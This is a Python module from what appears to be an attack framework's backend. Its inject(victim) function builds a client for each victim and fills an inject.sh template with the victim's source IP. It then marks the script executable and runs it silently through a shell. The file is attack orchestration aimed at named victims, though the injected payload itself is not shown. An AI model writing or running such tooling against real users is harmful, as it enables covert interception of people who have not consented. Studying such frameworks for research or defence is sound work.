from backend.settings import BASE_DIR

import os
import subprocess
import stat


rupture_dir = os.path.abspath(os.path.join(BASE_DIR, os.pardir))
client_dir = os.path.join(rupture_dir, 'client')


def inject(victim):
    _create_client(victim)
    _create_injection(victim)
    _run_injection(victim)


def _create_client(victim):
    realtimeurl = victim.realtimeurl
    victimid = victim.id

    with open(os.devnull, 'w') as FNULL:
        p = subprocess.Popen(
            [os.path.join(client_dir, 'build.sh'), str(realtimeurl), str(victimid)],
            cwd=client_dir,
            stdout=FNULL,
            stderr=subprocess.PIPE
        )
        return p.wait()


def _create_injection(victim):
    sourceip = victim.sourceip
    victimid = victim.id

    with open(os.path.join(client_dir, 'inject.sh'), 'r') as f:
        injection = f.read()

    injection = injection.replace('$1', str(sourceip))
    inject_file = os.path.join(client_dir, 'client_{}/inject.sh'.format(victimid))
    with open(inject_file, 'w') as f:
        f.write(injection)

    clientid_inject = inject_file
    st = os.stat(clientid_inject)
    os.chmod(clientid_inject, st.st_mode | stat.S_IEXEC)


def _run_injection(victim):
    victimid = victim.id
    clientid_dir = os.path.join(client_dir, 'client_{}'.format(victimid))

    with open(os.devnull, 'w') as FNULL:
        subprocess.Popen(
            os.path.join(clientid_dir, 'inject.sh'),
            shell=True,
            cwd=client_dir,
            stdout=FNULL,
            stderr=subprocess.PIPE
        )
